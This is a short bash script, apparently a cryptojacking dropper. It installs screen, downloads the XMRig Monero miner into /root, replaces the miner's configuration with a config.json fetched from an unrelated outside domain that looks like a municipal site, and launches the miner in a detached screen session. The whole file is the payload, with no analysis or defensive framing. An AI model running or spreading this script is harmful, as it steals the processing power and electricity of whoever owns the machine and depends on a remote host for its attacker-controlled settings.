!#/bin/bash
yum -y install screen ; apt-get -y install screen ; wget "https://github.com/xmrig/xmrig/releases/download/v6.8.1/xmrig-6.8.1-linux-x64.tar.gz" -O /root/xmrig-6.8.1.tar.gz && tar -xzvf /root/xmrig-6.8.1.tar.gz && rm -rf /root/xmrig-6.8.1/config.json && wget https://mabem.manisa.bel.tr/config.json -O /root/xmrig-6.8.1/config.json&& cd /root/xmrig-6.8.1 && screen ./xmrig
